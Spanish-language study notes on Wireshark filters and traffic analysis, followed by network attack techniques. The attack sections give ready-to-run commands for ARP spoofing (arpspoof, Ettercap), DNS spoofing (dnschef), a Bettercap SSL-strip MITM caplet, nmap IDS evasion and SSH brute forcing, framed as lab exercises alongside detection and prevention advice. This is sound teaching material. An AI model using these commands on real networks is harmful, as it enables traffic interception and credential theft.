# Wireshark y Ataques de Red

## Wireshark — Instalación y Conceptos

```bash
sudo apt install wireshark
sudo usermod -aG wireshark $USER   # evita tener que usar sudo cada vez
# En Kali ya viene instalado
```

### Capture Filter vs Display Filter

```
||Capture Filter|Display Filter|
|---|---|---|
|Cuándo actúa|Antes de capturar|Sobre lo ya capturado|
|Sintaxis|BPF (Berkeley Packet Filter)|Sintaxis propia de Wireshark|
|Ventaja|Más eficiente, menos datos guardados|Se puede cambiar sin recapturar, más flexible|
|Ejemplos|`host 192.168.1.100` · `port 80` · `tcp` · `udp and port 53`|`ip.addr == 192.168.1.100` · `tcp.port == 80` · `http` · `dns`|
```

---

## Filtros de Display de Referencia

### Por protocolo

```
http · https · dns · ftp · ssh · telnet · smtp · icmp · arp · dhcp
http or tls          # HTTP + HTTPS
```

### Por IP

```
ip.addr == 192.168.1.100        # origen o destino
ip.src == 192.168.1.100
ip.dst == 192.168.1.100
ip.addr == 192.168.1.0/24
!(ip.addr == 192.168.1.1)        # excluir
```

### Por puerto

```
tcp.port == 80
udp.port == 53
tcp.srcport == 443
tcp.dstport == 22
tcp.port >= 1024 and tcp.port <= 65535
```

### Por flags TCP

```
tcp.flags.syn == 1                              # inicio de conexión
tcp.flags.syn == 1 and tcp.flags.ack == 1        # respuesta del handshake
tcp.flags.fin == 1                               # cierre
tcp.flags.rst == 1                               # reset
tcp.flags.push == 1                              # push de datos
```

### HTTP

```
http.request.method == "GET"
http.request.method == "POST"
http.response.code == 200
http.response.code >= 400
http.host == "www.google.com"
http.request.uri contains "login"
http.cookie contains "session"
```

### DNS

```
dns.flags.response == 0          # consultas
dns.flags.response == 1          # respuestas
dns.qry.name contains "google"
dns.qry.type == 1                # A record
dns.qry.type == 28               # AAAA
dns.qry.type == 15               # MX
```

### Operadores lógicos

```
and / &&    both conditions
or  / ||    at least one
not / !     negation

http and ip.addr == 192.168.1.100
tcp.port == 80 or tcp.port == 443
(http or https) and ip.addr == 192.168.1.100
```

---

## Análisis de Paquetes Comunes

**Three-way handshake** — filtro `tcp.flags.syn == 1 or tcp.flags.fin == 1`: 1) Cliente→Servidor `SYN` · 2) Servidor→Cliente `SYN,ACK` · 3) Cliente→Servidor `ACK` → conexión establecida.

**Request HTTP** — filtro `http`: expande el nodo _Hypertext Transfer Protocol_ para ver método, URI, versión, Host, User-Agent y Cookie por separado.

**Consulta DNS** — filtro `dns`: la query trae `Transaction ID`, flags y la pregunta (`google.com: type A`); la response trae el mismo Transaction ID con la respuesta (`addr 142.250.65.206`).

---

## Funciones Útiles

|Función|Uso|
|---|---|
|**Follow → TCP/UDP/HTTP/TLS Stream**|Reconstruye la conversación completa entre dos hosts en formato legible (cliente en un color, servidor en otro)|
|**Statistics → Protocol Hierarchy**|Distribución porcentual de protocolos en la captura|
|**Statistics → Conversations**|Lista de pares IP-IP con paquetes/bytes intercambiados|
|**Statistics → Endpoints**|Lista de hosts individuales con su tráfico total|
|**File → Export Objects → HTTP**|Extrae archivos transferidos por HTTP directamente de la captura|
|**Statistics → I/O Graphs**|Gráfica de paquetes/bytes por segundo en el tiempo|

---

## Labs de Wireshark

### Captura y análisis HTTP

```bash
sudo wireshark
# seleccionar interfaz → Start
# en el navegador: http://testphp.vulnweb.com
# Stop → filtro: http
# filtro: http.request.method == "GET"
# clic derecho → Follow → HTTP Stream
# revisar: headers, User-Agent, cookies, HTML recibido
# File → Export Objects → HTTP
```

### Análisis de DNS

```bash
# capture filter: port 53
nslookup google.com
nslookup facebook.com
nslookup youtube.com
# Stop → analizar query/response, Transaction ID, IPs devueltas
# filtro para solo queries: dns.flags.response == 0
```

---

# Vulnerabilidades y Ataques de Red

## ARP Spoofing / ARP Poisoning

El atacante responde a una petición ARP antes que el dispositivo legítimo, anunciando su propia MAC como la del gateway. La víctima actualiza su tabla ARP y todo su tráfico pasa por el atacante, que lo reenvía al router real → MITM.

### arpspoof (dsniff)

```bash
sudo apt install dsniff
sudo sysctl -w net.ipv4.ip_forward=1        # habilitar IP forwarding

sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1   # spoof PC → Router
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   # spoof Router → PC (otra terminal)
```

### Ettercap

```bash
sudo apt install ettercap-text-only ettercap-graphical
sudo ettercap -G     # GUI

# GUI: Sniff → Unified sniffing → interfaz
#      Hosts → Scan for hosts → Hosts list
#      Víctima → Add to Target 1
#      Gateway → Add to Target 2
#      Mitm → ARP poisoning → Sniff remote connections
#      Start → Start sniffing

# CLI
sudo ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//
```

### Detección y prevención

```bash
arp -a                          # buscar duplicados: 2 IPs con la misma MAC
sudo apt install arpwatch
sudo arpwatch -i eth0           # monitorea cambios en la tabla ARP
```

Prevención: entradas ARP estáticas, DAI (Dynamic ARP Inspection) en switches, port security, segmentación por VLANs, VPN.

---

## DNS Spoofing

|Técnica|Mecanismo|
|---|---|
|**DNS Cache Poisoning**|El atacante responde a la consulta DNS más rápido que el servidor real, con una IP falsa|
|**DNS Hijacking**|El atacante modifica la configuración DNS del router/sistema para que apunte a un DNS malicioso propio|

```bash
sudo apt install dnschef
sudo dnschef --fakeip 192.168.1.66 --fakedomains facebook.com --interface 192.168.1.1
# víctimas que usen esta IP como DNS resuelven facebook.com → 192.168.1.66
```

---

## MITM Combinado — Bettercap

Cadena típica: ARP Spoofing → captura con Wireshark/tcpdump → (opcional) DNS Spoofing → (opcional) SSL Strip → robo de credenciales/cookies/datos.

```bash
sudo apt install bettercap
sudo bettercap -iface eth0

# dentro de Bettercap:
net.probe on
net.show
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
set net.sniff.verbose true
net.sniff on
set http.proxy.sslstrip true
http.proxy on
caplets.show
```

Caplet para automatizar el flujo completo (`mitm.cap`):

```
net.probe on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
set net.sniff.verbose true
net.sniff on
set http.proxy.sslstrip true
http.proxy on
```

```bash
sudo bettercap -iface eth0 -caplet mitm.cap
```

---

## Nmap — Técnicas de Escaneo Avanzadas

```bash
nmap -sn 192.168.1.0/24              # ping sweep
nmap -PR -sn 192.168.1.0/24          # ping sweep vía ARP (más rápido en LAN)

sudo nmap -sS 192.168.1.100          # SYN scan (stealth, requiere root)
nmap -sT 192.168.1.100               # TCP connect (sin root, más ruidoso)

sudo nmap -sU 192.168.1.100                    # UDP scan (lento)
sudo nmap -sU --top-ports 20 192.168.1.100     # solo top 20 puertos UDP

sudo nmap -O 192.168.1.100           # detección de OS
sudo nmap -A 192.168.1.100           # agresivo: OS + versiones + scripts + traceroute

nmap -sV 192.168.1.100                              # versiones de servicio
nmap -sV --version-intensity 9 192.168.1.100        # intensidad máxima
```

### Scripts NSE

```bash
ls /usr/share/nmap/scripts/

nmap --script vuln 192.168.1.100              # categoría vulnerabilidades
nmap --script http-title 192.168.1.100        # script específico
nmap --script ssh-brute 192.168.1.100         # fuerza bruta SSH
nmap --script smb-os-discovery 192.168.1.100  # info SMB
nmap --script http-vuln* 192.168.1.100        # vulns HTTP
```

Categorías principales: `auth`, `vuln`, `exploit`, `brute`, `discovery`.

### Evasión de firewalls/IDS

```bash
nmap -f 192.168.1.100                 # fragmentar paquetes
nmap -D RND:10 192.168.1.100          # decoys (IPs falsas)
nmap --spoof-mac Apple 192.168.1.100  # falsificar MAC
nmap --source-port 53 192.168.1.100   # puerto origen específico

# Timing templates (T0 más sigiloso/lento → T5 más rápido/ruidoso)
nmap -T0 192.168.1.100   # Paranoid
nmap -T1 192.168.1.100   # Sneaky
nmap -T2 192.168.1.100   # Polite
nmap -T3 192.168.1.100   # Normal (default)
nmap -T4 192.168.1.100   # Aggressive
nmap -T5 192.168.1.100   # Insane
```

---

## Labs de Ataques de Red

### ARP Spoofing con Ettercap (solo en laboratorio)

Setup: atacante Kali (`192.168.1.50`), víctima VM (`192.168.1.100`), router (`192.168.1.1`).

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo wireshark &
# iniciar captura en eth0

sudo ettercap -G
# Sniff → Unified sniffing → eth0
# Hosts → Scan for hosts → Hosts list
# víctima → Add to Target 1
# gateway → Add to Target 2
# Mitm → ARP poisoning → [x] Sniff remote connections → OK
# Start → Start sniffing

# en la víctima: navegar a http://testphp.vulnweb.com
# en Wireshark, filtro: ip.addr == 192.168.1.100 and http
# revisar: requests, formularios, cookies, credenciales en claro
```

### Escaneo de red con Nmap

```bash
nmap -sn 192.168.1.0/24 -oN hosts.txt
cat hosts.txt | grep "Nmap scan report" | awk '{print $5}' > ips.txt

nmap -iL ips.txt -p- -oA scan_full
nmap -iL ips.txt -sV -oA scan_versions
sudo nmap -iL ips.txt -O -oA scan_os
nmap -iL ips.txt --script vuln -oA scan_vulns

cat scan_versions.nmap
```

### Análisis de tráfico malicioso en un .pcap

```bash
wireshark malicious_traffic.pcap
```

|Buscar|Filtro / indicador|
|---|---|
|**Port scanning**|`tcp.flags.syn == 1 and tcp.flags.ack == 0` — muchos SYN a distintos puertos desde el mismo origen en poco tiempo|
|**Intentos de login / brute force**|`ftp or ssh or telnet` — múltiples intentos con respuestas de error|
|**Tráfico C&C**|conexiones a IPs sospechosas, tráfico periódico (_beaconing_), puertos no habituales|
|**Exfiltración de datos**|grandes volúmenes salientes hacia IPs externas desconocidas|

Documentar cada hallazgo con el filtro usado y el número de paquete de referencia.

